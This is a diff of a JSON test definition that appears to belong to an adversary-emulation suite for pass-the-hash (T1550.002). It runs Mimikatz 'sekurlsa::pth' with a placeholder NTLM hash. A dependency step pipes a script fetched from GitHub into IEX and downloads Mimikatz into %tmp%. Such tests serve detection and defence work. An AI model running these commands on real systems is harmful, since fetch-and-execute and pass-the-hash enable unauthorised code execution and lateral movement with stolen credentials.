@@ -7,68 +7,68 @@
   ],
   "steps": [
     {
-      "id": "ea6080bc-1d7d-4949-8166-816ee785d975",
+      "id": "833076e0-6d02-45c3-8b17-034932b0d880",
       "type": "execute-command",
       "data": {
-        "command": "#{mimikatz_path} \"sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}\"\n",
+        "command": "#{mimikatz_path} \"sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}\"",
         "command_type": "command_prompt"
       },
       "elevation_required": false
     },
     {
-      "id": "319cb87c-709d-44a0-8bbe-7859fc50cc6c",
+      "id": "a4bd459c-6b7f-4a9a-8beb-fdd5a30a9e71",
       "name": "Check dependency 1/1",
       "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
       "type": "execute-command",
       "data": {
-        "command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
-        "command_type": ""
+        "command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}",
+        "command_type": "command_prompt"
       },
       "elevation_required": false
     },
     {
-      "id": "a4d614f5-a234-417d-8d38-0f4373a8ab57",
+      "id": "3b0885e5-d840-4245-8561-06f35943ed27",
       "name": "Resolve dependency 1/1",
       "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
       "type": "execute-command",
       "data": {
-        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n",
-        "command_type": ""
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath",
+        "command_type": "command_prompt"
       },
       "elevation_required": false
     },
     {
-      "id": "446c6fa9-6a10-4187-a506-e3bfaaaef8f1",
+      "id": "82282378-86af-4175-a61a-003dc3f1ef76",
       "name": "Re-check dependency 1/1",
       "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
       "type": "execute-command",
       "data": {
-        "command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
-        "command_type": ""
+        "command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}",
+        "command_type": "command_prompt"
       },
       "elevation_required": false
     }
   ],
   "flows": [
     {
-      "s": "319cb87c-709d-44a0-8bbe-7859fc50cc6c",
+      "s": "a4bd459c-6b7f-4a9a-8beb-fdd5a30a9e71",
       "p": "on-success",
-      "o": "ea6080bc-1d7d-4949-8166-816ee785d975"
+      "o": "833076e0-6d02-45c3-8b17-034932b0d880"
     },
     {
-      "s": "319cb87c-709d-44a0-8bbe-7859fc50cc6c",
+      "s": "a4bd459c-6b7f-4a9a-8beb-fdd5a30a9e71",
       "p": "on-failure",
-      "o": "a4d614f5-a234-417d-8d38-0f4373a8ab57"
+      "o": "3b0885e5-d840-4245-8561-06f35943ed27"
     },
     {
-      "s": "a4d614f5-a234-417d-8d38-0f4373a8ab57",
+      "s": "3b0885e5-d840-4245-8561-06f35943ed27",
       "p": "on-success",
-      "o": "446c6fa9-6a10-4187-a506-e3bfaaaef8f1"
+      "o": "82282378-86af-4175-a61a-003dc3f1ef76"
     },
     {
-      "s": "446c6fa9-6a10-4187-a506-e3bfaaaef8f1",
+      "s": "82282378-86af-4175-a61a-003dc3f1ef76",
       "p": "on-failure",
-      "o": "ea6080bc-1d7d-4949-8166-816ee785d975"
+      "o": "833076e0-6d02-45c3-8b17-034932b0d880"
     }
   ],
   "tags": [
@@ -76,18 +76,6 @@
     "T1550.002"
   ],
   "input_arguments": [
-    {
-      "name": "domain",
-      "type": "string",
-      "description": "domain",
-      "value": "%userdnsdomain%"
-    },
-    {
-      "name": "mimikatz_path",
-      "type": "path",
-      "description": "mimikatz windows executable",
-      "value": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
-    },
     {
       "name": "user_name",
       "type": "string",
@@ -99,6 +87,18 @@
       "type": "string",
       "description": "ntlm hash",
       "value": "cc36cf7a8514893efccd3324464tkg1a"
+    },
+    {
+      "name": "domain",
+      "type": "string",
+      "description": "domain",
+      "value": "%userdnsdomain%"
+    },
+    {
+      "name": "mimikatz_path",
+      "type": "path",
+      "description": "mimikatz windows executable",
+      "value": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
     }
   ]
 }
